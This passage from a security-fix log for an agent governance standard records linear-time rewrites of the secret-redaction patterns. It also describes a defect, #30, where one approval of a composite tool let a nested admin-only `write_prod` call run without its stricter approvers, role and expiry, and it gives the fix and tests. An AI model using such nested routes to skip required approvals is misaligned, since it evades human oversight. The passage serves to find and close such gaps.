  header with no end after it matches the rest of the text with no
  `secret` group, which replaces nothing (`_replace_secret` and
  `replaceSecrets` keep such a match). A differential run of the old and
  new patterns on 200,000 to 300,000 random strings over each pattern's
  alphabet found no difference, but one in redaction: the URL rule now
  reads a scheme whose run starts with `_` or a digit before its letter
  (`x_https://u:pw@h`), which the old `\b` skipped, so redaction replaces
  that password too (a superset; the refusal rule already read it).
  Measured after: 1 MB of each adversarial shape in 0.1 to 0.6 s per call
  (`holds_credential`, `redact_text`, `holds_secret`), linear in a fuzz of
  every pattern over pairs of 40 atoms.
- The shell scan (`secret_scan.sh`) uses `grep -E`, which GNU grep runs as
  a DFA: 1 MB of each shape in 0.03 to 0.17 s, so it is unchanged.
- Tests: `tests/test_redaction.py::test_a_long_text_is_read_in_time_in_proportion_to_its_length`
  (twelve 1 MB shapes through `holds_credential`, `redact_text` and
  `holds_secret`, under 20 s; the old patterns ran past 100 s on `eyJ-`) and
  `test_the_patterns_read_a_run_once_and_match_as_before`; the same in
  `packages/acs-core/test/redact.test.ts` (the old patterns held the event
  loop past 110 s); vectors `url_userinfo_scheme_in_a_word` (failed on both
  old redactors), `jwt_after_dash` and `pem_header_without_end` (pins of
  the rewrite) in `tests/conformance/secrets/redact.json`.

#### 30. A composite's approval covered nested calls needing more (medium)

`groundedTool` took a composite's approval policy from its own options, so
bob, holding no role, approved `batch` once and its nested `write_prod`
(`role: admin`, two approvers, 60 s expiry) ran covered; a decision two
hours old covered it; through `outer` likewise. The adapter gave `batch` no
approval policy at all, so one permission prompt ran a binding it can never
allow directly.

- Fix (Standard §5.18.4, a new bullet): a composite's approval covers a
  nested call only as a decision valid for the nested binding's approval
  too, so a composite's call asks for the strictest of its own and,
  transitively, each binding it lists (the most `min_approvers`, the
  shortest `expires`, a `role` one of them sets, its own first); a layer
  that attributes a nested call the composite's decisions do not meet
  checks it as a call of its own.
  - Python (`bindings.py`, `join_approval`): `load_bindings` joins
    `ToolMapping.approval` transitively, through mappings known from
    earlier loads; the adapter's existing rules then refuse a composite
    that reaches two approvers or a role (F502) and apply the shortest
    expiry.
  - TypeScript package (`joinApproval`): `checkBindings`' effective
    `approval` is the same join.
  - Binding: the composite's policy is the join (`POLICY` per tool, a
    record's approval for a plain tool); the nesting token carries the
    request whose decisions approved the composite (its own, or the one
    that covered it), and a nested call is covered only when
    `decisionsCover` finds them valid for its own policy at the call (the
    role the request was asked under, enough distinct approvers counted
    within the shorter expiry). `requestApproval` starts a new round when
    the live request was asked under a weaker policy than the call's (a
    request a host made with `{}`, or one made before the join), so
    decisions given under the weaker one decide nothing.
- Tests: call fixture `composite_takes_invoked_approval` (31 fixtures; one
  approver for a composite whose invoked binding needs two: F502 on both
  layers, both routes of the adapter; failed on both old layers);
  `tests/test_tool_bindings.py::test_a_composite_takes_the_approval_of_its_invokes_transitively`;
  the `checkBindings` join test in `packages/acs-core/test/bindings.test.ts`;
  `test/nesting.test.ts`: the role, approvers and expiry asked of
  `batch` and `outer` (bob's `{}` request refused, bob not allowed to decide
  the joined one, two admins run it covered) and a nested call checked on
  its own (an `ops` composite, and an admin approval lapsed by the nested
  call): 2 failed before.

#### Siblings checked

- Plugin hooks: the pre-tool-use hook gates every Write, Edit, MultiEdit and
  NotebookEdit as `mutate` whatever the persist hook reads; unchanged.
- The audit skill's Edit hook refuses any edit of the records file, so it
  needs no after-the-call scan.
- Python adapter: nested calls are never seen; a composite reaching a send
  under a policy is refused and an unbound invoked name is V107 (batch 3),
  so #27 has no sibling there; #28's profiles are layer-wide already.
- `persistEntry` and the Python memory store scan before their size check
  (the vectors pin `secret_in_data` first); with linear patterns 1 MB takes
  under a second, so the order stays.

#### Documentation

Standard §5.18.4 (the approval bullet); SECURITY.md (§5.4 persist rows and
matcher, the redaction bullet, the class SL paragraph); the binding's
statement (`covers`, `does_not_cover`); the Standard Agents guide (sends and
memory, composites, `profiles`); the SDK guide (a composite's approval);
hooks/README and the persist skill (what the hook scans); the module
docstrings of the redactors, `layer.ts`, `memory.ts`, `grounded.ts` and
`approval.ts`; CHANGELOG (Upgrading: SDK, redaction, plugin persist hook,
`checkBindings`, binding composites and profiles; the fixture count). No
version changes.

#### Checks after batch 5

The batch was finished in a second session (the first was cut off after
changing code): the uncommitted changes were reviewed against the five
defects, the tests were run again on the old hook body, binding sources and
loaders (28 hook cases plus the 2 NotebookEdit matcher cases, and 9 binding
tests, failed), the healthcare profile was run through `memoryTools` on the
real WebAssembly core (persist and recall F502 with `person_required`, both
from the tool's own profiles and the layer's), and the persist row of
SECURITY.md §5.4 now states what the scan does not read.

- Python: `pytest tests/` (5246 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1896; the
  WebAssembly build reused); the binding's check and test (201, 2 skipped).
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed); `check-runs.mjs` on `/spec/1.2.0/` and `/guides/claude-agent-sdk/`
  with the 1248 headless shell (CI pins 1254): longest enforced runs 1795
  and 1798 px, in §4.4 and the SDK guide's evidence stores, neither a part
  this batch changed.
- Probes: none left running.
